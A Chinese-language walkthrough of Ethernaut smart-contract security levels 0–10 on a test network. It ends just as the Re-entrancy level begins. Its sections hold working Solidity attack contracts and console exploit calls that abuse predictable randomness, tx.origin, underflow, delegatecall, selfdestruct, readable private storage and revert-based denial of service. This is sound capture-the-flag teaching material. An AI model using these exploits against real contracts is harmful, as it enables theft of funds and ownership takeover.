区块链链安全-Ethernaut智能合约安全实战

# 准备
随着区块链技术的逐渐推广，区块链安全也逐渐成为研究的热点。在其中，又以智能智能合约安全最为突出。Ethernaut正是入门研究区块链智能合约安全的好工具。

- 首先，应确保安装Metamask，如果可以使用Google Extension可以直接安装，否则可以使用FireFox安装
- 新建账号，并连接到RinkeBy Test Network（需要在Setting - Advanced里启用Show test networks，并在网络中进行切换）
![新建账号并连接到Rinkeby网络](https://img-blog.csdnimg.cn/3c67df157b894812bdbc8155105ed9d1.png#pic_center)
现在就可以开始Ethernaut的探索之旅了！

<hr>

# 0. Hello Ethernaut
本节比较简单，所以我将更关注整体过程，介绍Ethernaut的实例创建等等，自己也梳理一下，所以会更详细一些。

## 准备工作
进入[Hello Ethernaut](https://ethernaut.openzeppelin.com/level/0x4E73b858fD5D7A5fc1c3455061dE52a53F35d966)，会自动提示连接Metamask钱包，连接后，示意图如下：
![成功连接Metamask](https://img-blog.csdnimg.cn/c9fe88e7be96472398522089637b2800.png#pic_center)
按F12打开开发者工具，在console界面就可以进行智能合约的交互。

![Console页面](https://img-blog.csdnimg.cn/b3a47b7643274905a82d521135891a23.png#pic_center)

## 创建实例并分析

单击 **Get New Instance** 以创建新的合约实例。

可以看出我们实际上是通过与合约`0xD991431D8b033ddCb84dAD257f4821E9d5b38C33`交互以创建实例。在辅导参数中，调用`0xdfc86b17`方法，附带地址为`0x4e73b858fd5d7a5fc1c3455061de52a53f35d966`作为参数。实际上，所有关卡创建实例时都会向`0xD991431D8b033ddCb84dAD257f4821E9d5b38C33`，附带的地址则是用来表明所处的关卡，如本例URL地址也为
`https://ethernaut.openzeppelin.com/level/0x4E73b858fD5D7A5fc1c3455061dE52a53F35d966`。

![创建合约交易界面](https://img-blog.csdnimg.cn/db6c7c3440fe491dbddc784b7f63ca2f.png#pic_center)
实例已经成功生成，主合约交易截图如下：

![主合约交易截图](https://img-blog.csdnimg.cn/8f44e837e6dd4e3da956ebf692e44f5f.png#pic_center)
进入交易详情，查看内部交易，发现合约之间产生了调用。第一笔是由主合约调用关卡合约，第二笔是由关卡合约创建合约实例，其中实例地址为`0x87DeA53b8cbF340FAa77C833B92612F49fE3B822`。

![实例创建合约内部调用](https://img-blog.csdnimg.cn/6b26254143f84e1e9a41d47ed5d2d756.png#pic_center)
回到页面来看，可以确认生成实例的确为`0x87DeA53b8cbF340FAa77C833B92612F49fE3B822`
![页面合约创建成功提醒](https://img-blog.csdnimg.cn/de7da387672b4eabb79bf7636924891e.png#pic_center)
下面我们将进行合约的交互以完成本关卡。

## 合约交互
此时，在console界面可以通过`player`和`contract`分别查看用户当前账户和被创建合约实例。`player`代表用户钱包账户地址，而`contract`则包含合约实例`abi`、`address`、以及方法信息。

![查看合约及用户信息](https://img-blog.csdnimg.cn/7d1ca04afdc6429fa9de422fe730c82c.png#pic_center)
按照提示要求输入`await contract.info()` ,得到结果`'You will find what you need in info1().'`。
![await contract.info()](https://img-blog.csdnimg.cn/35125f28609141a9a0109383815c31bc.png#pic_center)


输入`await contract.info1()`,得到结果`'Try info2(), but with "hello" as a parameter.'`。
![await contract.info1()`](https://img-blog.csdnimg.cn/3ff1befca4004be592837610ff437d09.png#pic_center)

输入`await contract.info2('hello')`,得到结果`'The property infoNum holds the number of the next info method to call.`。
![await contract.info2('hello')](https://img-blog.csdnimg.cn/82f8e87e34184ef195a402baf12c8c5e.png#pic_center)
输入`await contract.infoNum()`,得到infoNum参数值为`42`(Word中的首位)。这就是下一步要调用的函数(`info42`)。
![await contract.infoNum()](https://img-blog.csdnimg.cn/6300cc93ab624a55911e32ae0c072a87.png#pic_center)
输入`await contract.info42()`,得到结果`'theMethodName is the name of the next method.`，即下一步应当调用`theMethodName`。

![await contract.info42()](https://img-blog.csdnimg.cn/afda4eb70844402ca98002345b6490b7.png#pic_center)
输入`await contract.theMethodName()`,得到结果`'The method name is method7123949.`。

![await contract.theMethodName()](https://img-blog.csdnimg.cn/13d78442881f4ce195ce21b0215182f2.png#pic_center)
输入`await contract.method7123949()`,得到结果`'If you know the password, submit it to authenticate().`。
![await contract.method7123949()](https://img-blog.csdnimg.cn/cf26b809fa2748c0b0ef3c52274f2771.png#pic_center)
所以通过`password()`可以获取密码`ethernaut0`，并将其提交到`authenticate(string)`。
![找到密码并提交](https://img-blog.csdnimg.cn/191c07eb315345ae8a76bd8909da076b.png#pic_center)
注意当在进行`authenticate()`函数时，Metamask会弹出交易确认，这是因为该函数改变了合约内部的状态（以实现对关卡成功的检查工作），而其他先前调用的函数却没有（为View）。
![在这里插入图片描述](https://img-blog.csdnimg.cn/0989760f83794ea881a2f535585272f4.png#pic_center#pic_center)
此时，本关卡已经完成。可以选择**Sumbit Instance**进行提交，同样要签名完成交易

![签名完成提交](https://img-blog.csdnimg.cn/66059e5fbc6248a7b1b1a234c6b63cee.png#pic_center)
在此之后，Console页面弹出成功提示，本关卡完成！

![关卡完成](https://img-blog.csdnimg.cn/0b42143101b4462197252d7a81a21eca.png#pic_center)
## 总结
本题比较简单，更多的是要熟悉ethernaut的操作和原理。

<hr>

# 1. Fallback
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xe0D053252d87F16F7f080E545ef2F3C157EA8d0E`。
本关卡要求**获得合约的所有权并清空余额**。
观察其源代码，找到合约所有权变更的入口。找到两个，分别是`contribute()`及`receive()`，其代码如下：
```
  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```
按照`contribute()`的逻辑，当用户随调用发送小于`0.001 ether`，**其总贡献额超过了`owner`，即可获得合约的所有权**。这个过程看似简单，但是通过以下constructor()函数可以看出，在创建时，`owner`的创建额为`1000 ether`，所以这种方法不是很实用。

```
  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }
```
再考虑`receive()`函数，根据其逻辑，当用户发送任意`ether`，且在此之前已有贡献（已调用过`contribute()`函数），即可获得合约所有权。**`receive()`类似于`fallback()`，当用户发送通证却没有指定函数对应时(如`sendTransaction()`)，会调用该方法。**
在获取所有权后，再调用`withdraw`函数既可以清空合约余额。

## 合约交互
使用`contract`命令，查看合约abi及对外函数情况。

![合约abi及函数](https://img-blog.csdnimg.cn/ca81f6938bea489087a380312bda6580.png#pic_center)
调用`await contract.contribute({value:1})`，向合约发送1单位Wei。

![await contract.contribute({value:1})](https://img-blog.csdnimg.cn/e6211e11bdcb43fc806ce2d6ebd70d2c.png#pic_center)
此时，调用`await contract.getContribution()`查看用户贡献，发现贡献度为1，满足调用`receiver()`默认函数的最低要求。

![await contract.getContribution()](https://img-blog.csdnimg.cn/d4f112f0089b430c87b88ed2a15876b8.png#pic_center)
使用`await contract.sendTransaction({value:1})`构造转账交易发送给合约，
![await contract.sendTransaction({value:1})](https://img-blog.csdnimg.cn/263b3d780db54a6f88df79f165949b4e.png#pic_center)
调用`await contract.owner()  === player `确认合约所有者已经变更。
![await contract.owner()  === player](https://img-blog.csdnimg.cn/c21c29b5de1d4f1d909ba5d3e968738a.png#pic_center)
最后调用`await contract.withdraw()`取出余额。
![await contract.withdraw()](https://img-blog.csdnimg.cn/7bd967178c0041ef92bdb7e61c9d1e4d.png#pic_center)
提交实例，显示关卡成功！

![关卡成功](https://img-blog.csdnimg.cn/1a05ed68ed3943a1ba1ec1fc7bb40313.png#pic_center)
## 总结
本关卡也算比较简单，主要需要分析代码内部的逻辑，理解`fallback()`及`receive`的原理。

<hr>

# 2. Fallout
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x891A088f5597FC0f30035C2C64CadC8b07566DC2`。
本关卡要求获取合约的所有权。首先使用`contract`命令查看合约的abi及函数信息。
![contract](https://img-blog.csdnimg.cn/fee91f430b2e418d9c225641473da84f.png#pic_center)
查看合约源码，寻找可能的突破点。结果发现`Fal1out()`函数即为突破口。其代码如下：
```
  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```
对于Solidity来说，其在0.4.22前的编译器版本支持同合约名的构造函数，如：
```
pragma solidity ^0.4.21;

contract DemoTest{

    function DemoTest() public{

    }
}
```
而在0.4.22起[只支持利用`constructor()`构建](https://github.com/ethereum/solidity/releases/tag/v0.4.22)，如：
```
pragma solidity ^0.4.22;

contract DemoTest{
     constructor() public{

    }
}
```
但在本关卡中，很明显合约创建者出错，将`Fallout`写成了`Fal1out`。所以我们直接调用函数`Fal1out`即可获得所有权。

## 合约交互
使用`await contract.owner()`获取当前合约所有者为`0x0`地址。
![await contract.owner()](https://img-blog.csdnimg.cn/8dacb15b19e748abbd771d01bf8e4747.png#pic_center)
调用`await contract.Fal1out({value:1})`实现所有权的获取。
![await contract.Fal1out({value:1})](https://img-blog.csdnimg.cn/e3687b03f12a44dca2ccb359ece6d9ab.png#pic_center)
调用`await contract.owner() === player`确认已获取合约所有权。
![await contract.owner() === player](https://img-blog.csdnimg.cn/b27f5d99063448109e4e4310d0129430.png#pic_center)
提交实例，本关卡完成!
![关卡成功！](https://img-blog.csdnimg.cn/fab3442e57d04c60b7a84aae13a75dee.png#pic_center)
## 总结
本关卡比较简单，主要考察对于合约细节和构造函数的理解和把握。

<hr>

# 3. Coin Flip
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x85023291A7E49B6b9A5F47a22F5f23Ca92eB4e54`。
本关卡要求**连续10次猜对硬币的正反面**。

我们首先对代码展开观察，其代码示意如下图所示：

```
  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
可知，硬币的正反面是由当前区块前一区块的高度所决定的。如果我们不知道当前区块高度是多少，就难以提前预知硬币的正反面。且同时，合约通过lastHash保证同一区块只能有一次提交。
此处我们将引入合约间调用的概念，正如我们在`Hello Ethernaut`关卡中分析的那样，**合约也可以调用合约，具体操作则作为`Internal Txns`，但仍与初始调用处于同一区块中**。所以我们可以新建自己的智能合约，提前预测硬币正反面，并向关卡合约发出请求。

![实例创建合约内部调用](https://img-blog.csdnimg.cn/6b26254143f84e1e9a41d47ed5d2d756.png#pic_center)


下面就到了合约间调用的内容了，其主要有几种：
- 使用被调用合约实例（已知被调用合约代码）
- 使用被调用合约接口实例（仅知道被调用合约接口）
- 使用call命令调用合约

我们将编写自己的智能合约，从以上三个思路入手，实现合约间调用。

## 攻击合约编写
利用Remix在线编辑器编写合约，代码如下所示，其中`CoinFlipAttack`就是我们的攻击合约，而`CoinFlip`和`CoinFlipInterface`都是为目标合约提供abi接口而定义的：

```
pragma solidity ^0.6.0;

// 由于使用在线版本remix，所以需要
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.0.0/contracts/math/SafeMath.sol";

// 用于使用被调用合约实例（已知被调用合约代码）
contract CoinFlip {
// 复制本关卡代码，此处省略....
}

// 用于 使用被调用合约接口实例（仅知道被调用合约接口）
interface CoinFlipInterface {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipAttacker{
    
    using SafeMath for uint256;
    address private addr;
    CoinFlip cf_ins;
    CoinFlipInterface cf_interface;

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _addr) public {
        addr = _addr;
        cf_ins = CoinFlip(_addr);
        cf_interface = CoinFlipInterface(_addr);
    }

// 当用户发出请求时，合约在内部先自己做一次运算，得到结果，发起合约内部调用
    function getFlip() private returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        return side;
    }

// 使用被调用合约实例（已知被调用合约代码）
    function attackByIns() public {
        bool side = getFlip();
        cf_ins.flip(side);
    }

// 使用被调用合约接口实例（仅知道被调用合约接口）
    function attackByInterface() public {
        bool side = getFlip();
        cf_interface.flip(side);
    }

// 使用call命令调用合约
    function attackByCall() public {
        bool side = getFlip();
        addr.call(abi.encodeWithSignature("flip(bool)",side));
    }

}
```

## 合约交互

此时，我们选择`0.6.12+commit.27d51765.js`的编译器，通过编译，如下图所示：
![合约编译](https://img-blog.csdnimg.cn/3b7a79bc4d544eb3968b6347f536b60d.png#pic_center)
在部署页面，选择`Injected Web3`，连接`Metamask钱包`，调用攻击合约的构造函数，其中构造参数传入目标合约`0x85023291A7E49B6b9A5F47a22F5f23Ca92eB4e54`。

![部署合约](https://img-blog.csdnimg.cn/afd32c5f60e74f6582d2528c76dd6919.png#pic_center)
小狐狸签名，合约部署完成，攻击合约地址为`0xf0467DEE254dA52c8bF922B2A10BB835e7eb49fF`，显示如下调用接口，我们接下来将分别从以下三种方式展开攻击：
![攻击合约调用接口](https://img-blog.csdnimg.cn/14c9beee852f4a47aec1c718b241d9e2.png#pic_center)
- 使用被调用合约实例（attackByIns）
在调用前，我们有连续猜中次数为3，如下图所示：
![当前猜中次数](https://img-blog.csdnimg.cn/e57390f9c639400aa57d2d9935a76937.png#pic_center)
点击`attackByIns`，弹出Metamask确认弹窗，确认，当前区块已成功挖出。

![attackByIns](https://img-blog.csdnimg.cn/82f354d375f9440fbfa6fb95d56df13d.png#pic_center)
而此时连续猜中次数变为4，该方法验证成功！
![当前猜中次数](https://img-blog.csdnimg.cn/67fe550285904a84bcf0994d254321c6.png#pic_center)

- 使用被调用合约接口实例（attackByInterface）

此时，连续猜中次数为4，点击`attackByInterface`，弹出Metamask确认弹窗，确认，当前区块已成功挖出。

![attackByInterface](https://img-blog.csdnimg.cn/efcd6b418c904903a54f3c428acc23e1.png#pic_center)而此时连续猜中次数变为5，该方法验证成功！![当前猜中次数](https://img-blog.csdnimg.cn/5da15342201342b0ae4eed52ea13c485.png#pic_center)
- 使用call命令调用合约(attackByCall)
此时，连续猜中次数为5，点击`attackByCall`，弹出Metamask确认弹窗，确认，当前区块已成功挖出。
![attackByCall](https://img-blog.csdnimg.cn/ecbd17ba998d4d95b570898d0e6f7b78.png#pic_center)
而此时连续猜中次数变为6，该方法验证成功！
![当前猜中次数](https://img-blog.csdnimg.cn/ee7a84196a9a46c5b4b70f52b83f81e3.png#pic_center)

无论是哪种方法都可以实现同区块内的合约调用，但一定要注意`gas limit`的设置，如果不够会爆出`out of gas`或者`reverted`的错误，可以在小狐狸确认界面进行设置。

我们接下来可以使用任意调用再做4次直至到10，最终提交！
提交实例，本关卡完成!
![关卡成功！](https://img-blog.csdnimg.cn/d617977b9ce64bb78af97f4181b37310.png#pic_center)
## 总结
本关卡主要考察`solidity`的编写及合约间的调用。我在做的时候遇到了很多`gas`相关的问题，以前不是很注意，现在要非常注意了！

<hr>

# 4. Telephone
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xba9405B2d9D1B92032740a67B91690a70B769221`。
分析其合约源码，要求变更合约所有权，其突破口在于`changeOwner`函数，函数代码如下所示：

```
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```
其先决条件在于`tx.origin`与`msg.sender`不相同，那我们应对此展开研究。
- `tx.origin`会遍历整个调用栈并返回最初发送调用（或交易）的帐户的地址。
- `msg.sender`为直接调用智能合约功能的帐户或智能合约的地址

两者区别在于如果同一笔交易内有多笔调用，`tx.origin`保持不变，而`msg.sender`将会发生改变。我们将以此为根据，编写智能合约，将该合约作为中间人展开攻击。

## 攻击合约编写
同样在remix中编写合约，合约代码如下，与上一关卡类似，通过`interface`接口创建合约接口实例，我们则通过`attack函数执行攻击`：

```
pragma solidity ^0.6.0;

interface TelephoneInterface {
    function changeOwner(address _owner) external;
}



contract TelephoneAttacker {

    TelephoneInterface tele;

    constructor(address _addr) public {
        tele = TelephoneInterface(_addr);
    }

    function attack(address _owner) public {
        tele.changeOwner(_owner);
    }

}
```

## 合约交互
初始时，合约所有权尚未得到。

![合约所有权尚未取得](https://img-blog.csdnimg.cn/0b39df9d2b38423396c70221d227724f.png#pic_center)
我们在remix上部署合约，参数附带`0xba9405B2d9D1B92032740a67B91690a70B769221`以初始化被攻击合约接口实例`tele`。生成攻击合约地址为`0x25C2fdE7f0eC90fD3Ef3532261ed84D0f0201811`。

![部署攻击合约](https://img-blog.csdnimg.cn/28165579659e47fcb2d604ec3aa67f46.png#pic_center)

在remix上调用`attack`函数，参数为`0x0bD590c9c9d88A64a15B4688c2B71C3ea39DBe1b`即钱包地址。
![attack](https://img-blog.csdnimg.cn/e89a8d66a7914a29847f54dce9c7fba5.png#pic_center)
此时，再检查所有权发现已发生变更。
![所有权已变更](https://img-blog.csdnimg.cn/0305a2094581451cb39d35a4c89c493d.png#pic_center)
提交实例，本关卡已成功通过。
![Success](https://img-blog.csdnimg.cn/6ecd3c20c21f4d96af7672a96a167bbe.png#pic_center)
## 总结
`tx.origin`这个有很多合约在用，但如果使用不当，会引起很严重的后果。
比如说，我设置了合约，引起被攻击合约主动发起调用，在接受函数里展开攻击，就可以绕过`tx.origin`相关的安全设置。

<hr>

# 5. Token
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x7867dB9A1E0623e8ec9c0Ab47496166b45832Eb3`。
由合约创建过程来看，应是实例创建合约`0xD991431D8b033ddCb84dAD257f4821E9d5b38C33`调用关卡合约`0x63bE8347A617476CA461649897238A31835a32CE`创建目标合约，并向`player`转账20`token`。

![通证分配信息](https://img-blog.csdnimg.cn/0e195b20496541ed948ec96d5ac2179d.png#pic_center)


分析其合约源码，要求增加已有的通证数量，应该从`transfer`函数入手，函数代码如下：

```
  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```
这里代码里犯了一个错误，那就是对于`uint`运算没有做溢出检查，举例来说对于8位无符号整型，会有`0-1=255`及`255+1=0`的错误产生。我们就可以利用这一漏洞，实现通证的无限增发。

## 合约交互
调用`await contract.transfer('0x63bE8347A617476CA461649897238A31835a32CE',21)`函数，注意此处不能给自身转账，因为会先出现下溢出，再出现上溢出，我们直接转账给关卡合约21个`token`，此时`20-21`发生了下溢出，达到最大值。此时，可以看到，通证数量发生了增长。

![token数量增长](https://img-blog.csdnimg.cn/cc911378bdab4de2bce11d094cbf9769.png#pic_center)
提交实例，本关卡通过！
![Success!](https://img-blog.csdnimg.cn/1751b17064984e73abf10c474efe5b13.png#pic_center)

## 总结
这就是为什么我们需要`Safemath`。写合约时一定要注意上溢出和下溢出！

# 6. Delegation
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x3E446558C8e3BBf1CE93324D330E89e5Fd964b7d`。
本关卡要求**获取合约`Delegation`**的所有权。

对合约展开分析，源代码部分提供了两部分合约，一个是`Delegate`，另一个则是`Delegation`。两合约间通过`Delegation`的`fallback`函数，基于`delegatecall`方法展开调用。

```
  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
```

对于`Delegation`合约来说，其内部找不到更换所有权的代码，我们就可以换个思路，看看`Delegate`合约里有没有。分析合约可以看到，`pwn()`可以实现。

```
  function pwn() public {
    owner = msg.sender;
  }
```
这时候可能有人会感到疑惑，`Delegate`和`Delegation`是两个不同的合约，如果我们仅去修改`Delegate`里的`owner`，会对跨合约调用它的`Delegation`产生影响吗？

在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 `call`、`delegatecall `和` callcode `，我们下面就要来分析以下三种跨合约调用方法的区别（以用户A通过B合约调用C合约为例）：

- `call`: 最常用的调用方式，调用后内置变量 msg 的值会修改为调用者B，执行环境为被调用者的运行环境C。
- `delegatecall`:调用后内置变量 msg 的值A不会修改为调用者，但执行环境为调用者的运行环境B
- `callcode`:调用后内置变量 msg 的值会修改为调用者B，但执行环境为调用者的运行环境B

所以当时用`delegatecall`时，尽管我们是调用`Delegate`合约中的函数，但实际上，我们是在`Delegation`环境里去做得，可以理解为将代码“引入”了。因此，我们可以实现合约权的转移。

## 合约交互
初始化时，有合约所有权并不为`player`。
![并未获得所有权](https://img-blog.csdnimg.cn/f6bd605c2c154f598ab1c008254e25b1.png#pic_center)
使用`contract.sendTransaction({value:1,data:web3.utils.keccak256("pwn()").slice(0,10)})`来发起调用，结果失败，仔细一看是因为`fallback`没有`payable`修饰。这是一开始的理解错误，观察不够仔细。

![调用失败](https://img-blog.csdnimg.cn/a7e08be63df64893aa4d2db61be61db7.png#pic_center)
去掉`value`，重新调用`await contract.sendTransaction({data:web3.utils.keccak256("pwn()").slice(0,10)})`。此时合约所有权已完成转移。解释一下，这里`data`是为了调用`pwn`函数，使用`sha3`编码并取了前4个字节，此处因为没有入参，所以作了简化。
![获得所有权](https://img-blog.csdnimg.cn/a6267ca66a6e46a0b22fc9a5f7b5f4a6.png#pic_center)
提交合约实例，本关卡成功！

![Success!](https://img-blog.csdnimg.cn/2029386e649b42118cd079e83ea8d69f.png#pic_center)
## 总结
合约间的调用需要非常谨慎，`delegate`原来是为了编程弹性，但如果处理不当，会给安全带来很大问题！

<hr>

# 7. Force
不好意思，最近工作上略有些忙，因为工作涉及到对外网络安全贸易，所以最近一直忙着培训。但这块肯定会持续完成。

## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xa39A09c4ebcf4069306147035dd7cE7735A25532`。
本关卡要求给合约`Force`转入通证，但是究其合约，似乎并没有payable函数。那么我们该怎么做呢？

在实际中，如果要给智能合约转账，有几种常见方法。

- **Transfer**: Throws exception when an error occurs, and the code will not execute afterward
- **Send**: The transfer error does not throw an exception and returns true/false. The code will continue to execute.
- **call.value().gas**: Transfer error does not throw an exception and returns true/false. The code will execute, but call functions for transfer are prone to reentrancy attacks.

三种方式存在一个前提，即接受合约必须能够接受转账，即存在payable函数，否则将会回退。

那么有没有其他方法呢？

However, there’s another way to transfer funds without obtaining the funds first: The Self Destruct function. Selfdestruct is a function in the Solidity smart contract used to delete contracts on the blockchain. When a contract executes a self-destruct operation, the remaining ether on the contract account will be sent to a specified target, and its storage and code are erased

也就是说，我们可以通过合约的自毁函数，将合约剩下的以太发送给指定地址，此时不需要判断该地址谁否能够接受转账。所以我们可以构建智能合约，完成自毁，即可实现攻击。

## 合约交互
合约本身并不提供余额查询，所以我们前往链上查询。此时合约余额为0。

![目标合约余额为0](https://img-blog.csdnimg.cn/bd8b14bb719d47e087068770e2f16863.png#pic_center)
我们通过remix构建合约，其中写入自毁函数。

```
pragma solidity ^0.6.0;

contract ForceAttacker {

    constructor() public payable{

    }

    function destruct(address payable addr) public {
        selfdestruct(addr);
    }

}
```
新建合约，部署到Rinkeby测试网，合约地址`0x7718f44c496885708ECb8CC84Af4F3d51338cb3C`

![部署合约](https://img-blog.csdnimg.cn/bd5161f0c0804741840aa1c0aa1d9819.png#pic_center)

以被攻击合约为变量，调用`destruct`函数。

![发动自毁攻击](https://img-blog.csdnimg.cn/b46967090812415aaa454b49545b1239.png#pic_center)

此时可以看到，被攻击合约链上地址余额发生变化，从0变为了50。

![自毁攻击成功](https://img-blog.csdnimg.cn/5f2676a45e204989802d1e6590e11a06.png#pic_center)
提交实例，本关卡成功通过！
![关卡成功](https://img-blog.csdnimg.cn/b118a76689ed47bdb96a0723ee9ca30c.png#pic_center)
## 总结
`selfdestruct`不会触发payable检查，如果没有很好的检查，很可能会对合约本身的运行带来难以预估的影响。为了防止黑客对于`this.balance`的操纵，我们应使用`balance`变量来接受特定业务逻辑的余额。

<hr>

# 8. Vault
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0x81E840E30457eBF63B41bE233ed81Db4BcCF575E`。

对合约展开分析，本关卡的要求是解锁，而解锁的唯一办法是输入正确的`password`。本关卡对`password`的定义是私有变量，那时不时就看不到了呢？

答案是否定的，一切变量都存储在链上，我们自然可以看到。现在问题就是，在哪看，用什么看？

第一个回答是用什么看？

`web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])`，使用这个命令可以看到储存在某个地址的存储内容。
其参数代表含义如下：
```
String - The address to get the storage from.
Number|String|BN|BigNumber - The index position of the storage.
Number|String|BN|BigNumber - (optional) If you pass this parameter it will not use the default block set with web3.eth.defaultBlock. Pre-defined block numbers as "earliest", "latest" and "pending" can also be used.
Function - (optional) Optional callback, returns an error object as first parameter and the result as second.
```
一般来说，我们使用`web3.eth.getStorageAt("0x407d73d8a49eeb85d32cf465507dd71d507100c1", 0)
.then(console.log);`，后面两个参数一般都是可选的。

第二个回答是怎么看?

以太坊数据存储会为合约的每项数据指定一个可计算的存储位置，存放在一个容量为 2^256 的超级数组中，数组中每个元素称为插槽（slot），其初始值为 0。虽然数组容量的上限很高，但实际上存储是稀疏的，只有非零 (空值) 数据才会被真正写入存储。每个数据存储的插槽位置是一定的。

```
# 插槽式数组存储
----------------------------------
|               0                |     # slot 0
----------------------------------
|               1                |     # slot 1
----------------------------------
|               2                |     # slot 2
----------------------------------
|              ...               |     # ...
----------------------------------
|              ...               |     # 每个插槽 32 字节
----------------------------------
|              ...               |     # ...
----------------------------------
|            2^256-1             |     # slot 2^256-1
----------------------------------
```
每个插槽32字节，对于值类型，其存放是连续的，满足以下规律。

- 存储插槽的第一项会以低位对齐（即右对齐）的方式储存
- 基本类型仅使用存储它们所需的字节
- 如果存储插槽中的剩余空间不足以储存一个基本类型，那么它会被移入下一个存储插槽
- 结构和数组数据总是会占用一整个新插槽（但结构或数组中的各项，都会以这些规则进行打包）

例如以下合约
```
pragma solidity ^0.4.0;

contract C {
    address a;      // 0
    uint8 b;        // 0
    uint256 c;      // 1
    bytes24 d;      // 2
}
```

其存储布局如下：

```
-----------------------------------------------------
| unused (11) | b (1) |            a (20)           | <- slot 0
-----------------------------------------------------
|                       c (32)                      | <- slot 1
-----------------------------------------------------
| unused (8) |                d (24)                | <- slot 2
-----------------------------------------------------
```

回到本题，很明显存储摆放应该是

```
-----------------------------------------------------
| unused (31) |           locked(1)          | <- slot 0
-----------------------------------------------------
|                       password (32)                      | <- slot 1
-----------------------------------------------------
```
所以我们可以通过`slot1`获取password信息。

## 合约交互
输入`await web3.eth.getStorageAt(contract.address,1)`获取`byte32 password`。
![await web3.eth.getStorageAt(contract.address,1)](https://img-blog.csdnimg.cn/0a3157ce7daf448dafe56dc2f4ab62fd.png#pic_center)
此时，合约仍然上锁（可通过`await contract.locked()`）查询。

![合约仍然上锁](https://img-blog.csdnimg.cn/98ec7d0001f8424a917dbee079e23d29.png#pic_center)
调用`await contract.unlock('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')`实现对合约的解锁。
![解锁合约](https://img-blog.csdnimg.cn/6606270e03964f9e8d50931f50f8bd2e.png#pic_center)
此时，合约已经解锁。
![在这里插入图片描述](https://img-blog.csdnimg.cn/8f190d1a37ba47aba563bee0c7f42f06.png#pic_center)
提交实例，本关卡成功通过。
![关卡成功](https://img-blog.csdnimg.cn/8928aeb11a1d47b1a614f5e7c82486d9.png#pic_center)


## 总结
区块链上没有秘密。

<hr>

# 9 King
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xb21Cf6f8212B2Ef639728Ae87979c6d63d976Ef2`。对其合约展开分析，其合约功能在于以下代码段：

```
  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }
```
当接收到外来转账时，如果发送金额大于当前奖金，即将发送金额发送给当前国王，更新奖金，而发送者将成为新的国王。
本关卡目的在于打破这一循环。

打破这一循环的入手点就在于该函数交互实际上是一个连续的过程。

1. 用户发送指定金额的以太。
2. 合约将以太转发给当前国王
3. 更新国王及奖金。

我们只要作为国王，拒不接受合约转来的奖金，整个过程即可回退。

## 攻击合约编写
我们同样在remix里编写攻击合约。如下：

```

contract KingAttacker {

    constructor() public payable{

    }

    function attack(address payable addr) public payable{
        addr.call.value(msg.value)("");
    }
    
    fallback() external payable{
        revert();
    }

} 
```

在接受函数，我们主动回退，即可防止合约继续执行。

## 合约交互
首先我们先看看当前我们需传入多少。在目标合约详情页面，可以看到，创建合约时传入0.001Ether。

![合约详情](https://img-blog.csdnimg.cn/4d99ea85376f4dacb6863f18303c582a.png#pic_center)
所以我们创建攻击合约(`0x9Fd9980aCb9CAb42EDE479e99e01780E8c79b208`)后，传入2Finney，调用攻击合约`attack`方法。

![发起攻击](https://img-blog.csdnimg.cn/0c96f45258844e2bb2470aabe47140c4.png#pic_center)
此时我们看看国王，使用`await contract._king()`，可以看出，国王已经变成攻击合约。
![await contract._king()](https://img-blog.csdnimg.cn/c9f8dd9f30224a30b7184283ba6f1ee0.png#pic_center)
提交合约，关卡成功！

![关卡成功](https://img-blog.csdnimg.cn/f442c6dc1e6c4dc6a70a66df62c81984.png#pic_center)
查看链上数据可知，在执行过程中产生了回滚(`revert`)。
![revert](https://img-blog.csdnimg.cn/94cab9cc01d445979ace117005310b53.png#pic_center)
## 总结
攻击时可以从合约执行的多个角度入手。

<hr>


# 10 Re-entrancy
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xfe3E5BdD6E5ae5efb4eea5735b3E3738991fFc2e`。对其合约展开分析，其合约提取函数如下：

```
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
```
